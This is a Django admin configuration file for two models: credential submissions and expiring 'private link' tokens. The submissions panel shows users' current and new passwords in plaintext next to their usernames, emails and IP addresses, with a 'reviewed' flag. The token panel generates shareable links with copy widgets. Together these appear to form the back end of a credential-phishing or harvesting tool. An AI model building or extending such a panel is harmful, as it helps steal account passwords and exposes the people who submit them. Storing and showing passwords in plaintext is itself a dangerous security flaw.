from django.contrib import admin
from django.utils.html import format_html
from .models import CredentialUpdateToken, CredentialSubmission


@admin.register(CredentialSubmission)
class CredentialSubmissionAdmin(admin.ModelAdmin):
    list_display = ['username', 'email', 'current_password', 'new_password', 'submitted_at', 'ip_address', 'reviewed']
    list_filter = ['reviewed', 'submitted_at']
    search_fields = ['username', 'email', 'ip_address']
    readonly_fields = ['submitted_at', 'ip_address']
    list_editable = ['reviewed']
    ordering = ['-submitted_at']
    
    fieldsets = (
        ('Submitted Credentials', {
            'fields': ('email', 'username', 'current_password', 'new_password')
        }),
        ('Submission Details', {
            'fields': ('submitted_at', 'ip_address', 'reviewed', 'notes')
        }),
    )


@admin.register(CredentialUpdateToken)
class CredentialUpdateTokenAdmin(admin.ModelAdmin):
    list_display = ['created_at', 'expires_at', 'is_valid_display', 'copy_link']
    list_filter = ['created_at', 'expires_at']
    search_fields = ['token', 'description']
    readonly_fields = ['token', 'created_at', 'full_link_display']
    
    fieldsets = (
        ('Token Information', {
            'fields': ('token', 'full_link_display', 'created_at', 'expires_at', 'description')
        }),
    )
    
    def is_valid_display(self, obj):
        return "✅ Valid" if obj.is_valid() else "❌ Expired"
    is_valid_display.short_description = 'Status'
    
    def copy_link(self, obj):
        link = obj.get_private_link()
        return format_html(
            '<a href="{}" target="_blank" style="color: #0078d4; font-weight: bold;">📋 Open Link</a>',
            link
        )
    copy_link.short_description = 'Link'
    
    def full_link_display(self, obj):
        link = obj.get_private_link()
        return format_html(
            '<div style="background: #f0f0f0; padding: 10px; border-radius: 5px; font-family: monospace;">'
            '<strong>Copy this link:</strong><br>'
            '<input type="text" value="{}" readonly style="width: 100%; padding: 5px; margin-top: 5px;" '
            'onclick="this.select(); document.execCommand(\'copy\'); alert(\'Link copied to clipboard!\');">'
            '</div>',
            link
        )
    full_link_display.short_description = 'Full Link (Click to Copy)'

